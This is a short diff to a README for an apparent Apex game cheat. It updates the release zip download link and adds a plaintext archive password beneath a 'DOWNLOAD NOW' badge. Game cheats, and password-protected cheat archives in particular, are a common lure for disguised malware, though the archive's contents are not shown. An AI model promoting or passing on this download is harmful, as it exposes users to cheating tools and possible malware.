@@ -30,11 +30,12 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/ZebraSmelter/Meccha-Apex-Cheat/releases/download/27/ApexMeccha.zip">
+  <a href="https://github.com/ZebraSmelter/Meccha-Apex-Cheat/releases/download/28/MecchaApex.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
-
+ 
+## Password: MecchaApex
 ---
 
 ## ✨ Features
